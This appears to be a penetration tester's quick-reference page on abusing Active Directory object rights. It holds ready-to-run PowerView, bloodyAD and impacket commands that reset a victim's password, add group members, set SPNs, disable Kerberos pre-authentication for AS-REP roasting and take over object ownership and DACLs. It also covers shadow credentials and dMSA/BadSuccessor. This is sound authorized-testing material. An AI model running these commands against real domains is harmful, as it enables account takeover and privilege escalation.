# AD object rights and advanced paths

[← Active Directory quick reference](../05-active-directory.md) · [ACL discovery](spn-acl-shares.md#object-acls)

Record the principal, right, target object, and original value before making a change. A BloodHound edge is a lead until the right works on that exact object.

## User and group rights

| Right | Check or use |
| --- | --- |
| `ForceChangePassword` | Can you reset this user's password? |
| `GenericWrite` or `GenericAll` on a user | Can you change an SPN, pre-auth flag, or another useful attribute? |
| `GenericAll` on a group | Can you add your principal as a member? |
| `WriteOwner` or `WriteDACL` | Can you gain the needed edit right while preserving the original owner and ACL? |

From a Windows shell with PowerView:

```powershell
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/x'}
net group "Target Group" me /add /domain
```

From Kali, a confirmed right to edit the user's UAC flags can support a targeted AS-REP check. Restore the flag afterward:

```bash
bloodyAD -u me -p pass -d corp.example --host <dc-ip> add uac victim -f DONT_REQ_PREAUTH
impacket-GetNPUsers corp.example/ -dc-ip <dc-ip> -request-user victim -no-pass -format hashcat
bloodyAD -u me -p pass -d corp.example --host <dc-ip> remove uac victim -f DONT_REQ_PREAUTH
```

For a confirmed owner path, save the original owner and ACL before changing either one:

```bash
impacket-owneredit -action write -new-owner me -target victim 'corp.example/me:pass'
impacket-dacledit -action write -rights FullControl -principal me -target victim 'corp.example/me:pass'
```

## Sealed LDAP, object restore & newer primitives

If a plain LDAP bind returns `strongerAuthRequired`, try a Kerberos-authenticated or sealed LDAP connection. Check LDAPS separately; a reset alone does not establish why it failed.

```bash
bloodyAD -u user -p pass -d corp.local --host dc01.corp.local get writable
```

A tombstoned object may be restorable if you have the required write right on it and create-child right in the destination OU:

```bash
bloodyAD -u user -p pass -d corp.local --host dc01.corp.local set restore <deleted-object> \
  --newParent OU=Employees,DC=corp,DC=local
```

Shadow credentials through `msDS-KeyCredentialLink` need a working PKINIT path. If certificate authentication returns `KDC_ERR_PADATA_TYPE_NOSUPP`, check DC support before continuing.

On Windows Server 2025 DCs, dMSA/BadSuccessor depends on rights over both the dMSA and target account after CVE-2025-53779. The patch closes the original one-sided takeover. Check DC patch state and both object rights before pursuing it. [Original research](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) · [patch analysis](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch).
